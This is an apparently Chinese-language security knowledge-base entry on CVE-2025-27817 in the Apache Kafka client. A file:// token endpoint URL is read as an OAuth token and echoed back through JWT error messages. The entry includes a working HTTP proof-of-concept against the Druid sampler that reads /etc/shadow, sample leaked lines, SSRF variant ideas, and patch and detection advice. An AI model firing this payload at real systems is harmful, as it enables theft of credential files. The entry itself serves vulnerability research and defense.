---
id: web-java-component-kafka-client-oauthbearer-token-endpoint-url-file-read
title: Apache Kafka Client SASL/OAUTHBEARER 可控 token.endpoint.url=file:// 任意文件读取（JWT 校验报错回显）与 SSRF（CVE-2025-27817）
type: scenario
domain: web
path: web/java/component
technique: sasl-oauthbearer-token-endpoint-url-file-scheme-read
aliases:
- CVE-2025-27817
- Kafka Client 任意文件读取
- sasl.oauthbearer.token.endpoint.url
- FileTokenRetriever
- OAUTHBEARER token 文件读取
- Kafka Connect 配置注入
tags:
- kafka
- kafka-clients
- java
- sasl
- oauthbearer
- arbitrary-file-read
- file-scheme
- ssrf
- config-injection
- jwt-error-echo
- cve-2025-27817
- druid
cve:
- CVE-2025-27817
affected_versions: 2.3.0 <= Apache Kafka Client <= 3.9.0
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-8
  verified_at: '2026-11-08T01:02:45+08:00'
  notes: 已对照原文核对：受影响区间见原文第7-9行漏洞影响范围 2.3.0 <= Apache Kafka Client <= 3.9.0，为明确受影响区间而非 pom 3.9.0、vulhub 3.3.1 等环境版本，故 set-versions 固化。PoC 确已打通：img-11 控制台 Malformed JWT provided(flag{readit!})、img-12 Druid HTTP 400 的 error 字段回显 /etc/shadow 内容(root:*:17602:0...)。原理、类名 FileTokenRetriever/AccessTokenRetrieverFactory/OAuthBearerLoginCallbackHandler、3.9.1 补丁 validateUrl 允许列表、CVE-2025-27817、路径 web/java/component 均与原文及截图一致。SSRF 面向已在变体与关联中正确标注为未单独复现、未升格为结论，未把半链包装成攻击面。未验证点：http(s) 打内网/云元数据的 SSRF 变体与上层吞异常时的盲读变体为作者推断，原文未复现。
---

## 一句话结论

当攻击者能控制 Kafka 客户端的 SASL 配置（如 Kafka Connect 连接器、Druid 的 Kafka sampler 的 `consumerProperties`）时，把 `sasl.oauthbearer.token.endpoint.url` 设为 `file:///etc/shadow`，客户端会把该本地文件当成 OAuth access token 读取；文件内容不是合法 JWT，在登录阶段的 JWT 校验里抛异常，而异常消息把文件内容原样拼进去，最终经上层应用的报错/HTTP 响应回显，形成完整的任意文件读取链。

## 原理

- **为什么 `file://` 会被当成本地文件读**：Kafka 客户端 SASL/OAUTHBEARER 登录时由 `AccessTokenRetrieverFactory.create()` 根据 `sasl.oauthbearer.token.endpoint.url` 选择 token 获取方式。受影响版本中，只要 URL 协议是 `file`（`tokenEndpointUrl.getProtocol().equalsIgnoreCase("file")`），就走 `new FileTokenRetriever(cu.validateFile(...))`：`ConfigurationUtils.validateFile` 把 URL 转成 `new File(url.toURI().getRawPath()).getAbsoluteFile()`，`FileTokenRetriever.init()` 用 `Utils.readFileAsString(...)` 读出内容并 `trim()` 后作为 `accessToken`。也就是说这个配置项的值既是"URL"又被当作"本地文件路径"，未限制协议。
- **为什么文件内容会回显**：登录回调 `OAuthBearerLoginCallbackHandler.handleTokenCallback()` 取到 access token 后调用 `AccessTokenValidator.validate(accessToken)`，要求 token 是三段式 JWT（header.payload.signature）。读进来的 `/etc/shadow` 只有一段，`validate` 抛 `ValidateException`，消息形如 `Malformed JWT provided (<文件内容>): expected three sections ... but 1 sections provided`。`handleTokenCallback` 捕获后 `log.warn(e.getMessage())` 并 `callback.error("invalid_token", e.getMessage(), ...)`，该错误经 `OAuthBearerLoginModule.identifyToken()` 包装成 `LoginException` 向上抛，最终 `new KafkaConsumer<>(props)` / 登录流程失败。上层若把异常 message 放进响应（如 Druid sampler 的 HTTP 400 `error` 字段），文件内容就被带出。
- **为什么不需要真正连上 broker**：文件读取与 JWT 校验都发生在客户端构造/登录阶段的本地逻辑里，`bootstrap.servers` 指向不可达地址也不影响触发；异常在建立连接之前就产生。因此这是一条自洽的、危害明确的读取链，而非半链。
- **补丁思路（3.9.1）**：`AccessTokenRetrieverFactory` 把 `validateFile` 换成 `validateUrl`，并新增 `throwIfURLIsNotAllowed` / 允许列表 `sasl.oauthbearer.allowed.urls`（`ALLOWED_SASL_OAUTHBEARER_URLS_CONFIG`），默认只允许 http(s) 端点、显式拒绝 `file://`，从源头堵死本地文件协议。

## 触发条件

- 攻击者能写入/修改 Kafka 客户端的 SASL 相关配置：典型是暴露了可创建连接器或可配置 `consumerProperties` 的接口（Kafka Connect REST、Druid Kafka sampler、各类把用户 JSON 透传给 `new KafkaConsumer(properties)` 的数据集成/流处理平台）。
- 目标使用的 `kafka-clients` 在受影响区间内，且 `sasl.mechanism=OAUTHBEARER`（`security.protocol` 为 `SASL_SSL` 或 `SASL_PLAINTEXT` 均可）。
- 目标进程对欲读文件有读权限（如 `/etc/shadow` 需 root 或以高权限用户运行）。
- 上层应用会把登录异常信息回显给攻击者；若完全吞掉异常，则退化为盲读（仍可借报错时延/日志外带，但本文验证的是有回显路径）。

## 利用步骤

1. 找到一处允许用户自定义 Kafka consumer 属性的入口（如 `/druid/indexer/v1/sampler?for=connect` 的 `ioConfig.consumerProperties`），确认其未对 SASL 属性做白名单过滤。
2. 在配置里设置 `sasl.mechanism=OAUTHBEARER`、`security.protocol=SASL_SSL`、`sasl.login.callback.handler.class=org.apache.kafka.common.security.oauthbearer.secured.OAuthBearerLoginCallbackHandler`。
3. 把 `sasl.oauthbearer.token.endpoint.url` 设为 `file://<目标文件绝对路径>`，并在 `sasl.jaas.config` 的 `OAuthBearerLoginModule` 里把 `tokenEndpointUrl` 设为同样的 `file://` 值（两处一致，保证 retriever 与 JAAS 都走文件分支）。
4. 提交请求触发构造 Kafka consumer / 登录；客户端读文件为 token → JWT 校验失败 → 抛 `LoginException`，消息内含文件内容。
5. 从报错或 HTTP 400 响应的 `error` 字段读取被带出的文件内容（如 `root:*:...` 的 `/etc/shadow` 行）。

## PoC

最小化 HTTP 请求（Druid Kafka sampler 形态，其余平台按同样 consumerProperties 填入即可）：

```http
POST /druid/indexer/v1/sampler?for=connect HTTP/1.1
Host: <target>:8888
Content-Type: application/json

{
  "type": "kafka",
  "spec": {
    "type": "kafka",
    "ioConfig": {
      "type": "kafka",
      "consumerProperties": {
        "bootstrap.servers": "127.0.0.1:6666",
        "sasl.mechanism": "OAUTHBEARER",
        "security.protocol": "SASL_SSL",
        "sasl.login.callback.handler.class": "org.apache.kafka.common.security.oauthbearer.secured.OAuthBearerLoginCallbackHandler",
        "sasl.oauthbearer.token.endpoint.url": "file:///etc/shadow",
        "sasl.jaas.config": "org.apache.kafka.common.security.oauthbearer.OAuthBearerLoginModule required clientId=\"test\" clientSecret=\"pass\" scope=\"x\" debug=\"true\" tokenEndpointUrl=\"file:///etc/shadow\";"
      },
      "topic": "test",
      "useEarliestOffset": true
    }
  }
}
```

响应体 `error` 字段回显（节选）：

```text
Unable to create RecordSupplier: Malformed JWT provided (root:*:17602:0:99999:7:::
daemon:*:17602:0:99999:7::: ...): expected three sections (header, payload, and signature), but 1 sections provided
```

括号中即为 `/etc/shadow` 内容。本地最小复现只需一个 Java `Properties`（同样四项 SASL 配置 + `file:///d:/flag.txt`）后 `new KafkaConsumer<>(props)`，构造时抛出携带文件内容的 `LoginException`。

## 变体与关联

- **SSRF 面向**：同一类配置项 `sasl.oauthbearer.token.endpoint.url` 与 `sasl.oauthbearer.jwks.endpoint.url` 取 `http(s)://` 时，客户端会向该地址发起 token/JWKS 请求，可指向内网服务或云元数据地址形成 SSRF；本文仅给出 `file://` 文件读取的验证，SSRF 面向未在文中单独复现，故不作为独立结论，利用时按盲/回显 SSRF 自行确认。
- **同类组件模式**：与 Apache Solr `DumpRequestHandler stream.url=file://`、kkFileView `getCorsFile urlPath=file://`、Jenkins CLI `@文件` 一样，都是"用户可控 URL/路径未限制协议 → 服务端读本地文件 → 经报错或响应回显"。
- **回显通道变体**：若上层吞异常，可结合 `debug="true"` 让 JAAS 日志落盘，或借报错时延做 oracle；核心 sink 仍是 `FileTokenRetriever` 读文件 + JWT 校验报错。
- **关联**：[[web-java-component-solr-dumprequesthandler-file-read]]、[[web-java-component-kkfileview-getcorsfile-urlpath-ssrf-file-read]]、[[web-generic-ssrf-apache-cxf-aegis-xop-include-file-read]]。

## 检测与防御

- **升级**：将 `kafka-clients` 升级到 3.9.1 及以上；该版本用 `validateUrl` + `sasl.oauthbearer.allowed.urls` 白名单拒绝 `file://` 协议。
- **配置收敛**：不要把用户/前端可控的 JSON 原样透传为 Kafka consumer properties；对 `sasl.*`、`sasl.jaas.config`、`*.endpoint.url` 等属性做严格白名单，禁止 `file://`、`jar:` 等本地/危险协议，只允许受信任的 http(s) 主机。
- **最小权限**：以低权限账号运行 Kafka Connect/Druid 等进程，降低 `/etc/shadow`、私钥等敏感文件被读取的影响。
- **回显治理**：上层接口不要把底层登录异常原文直接返回给调用方；脱敏后再返回，避免把文件内容、内部路径带出。
- **检测**：监控是否出现 `sasl.oauthbearer.token.endpoint.url` / `sasl.jaas.config` 中带 `file://` 的连接器创建/采样请求，以及日志中出现 `Malformed JWT provided` 且括号内含非 JWT 文本（如 `root:`）的异常；对暴露 Kafka consumer 配置的端点做鉴权与审计。
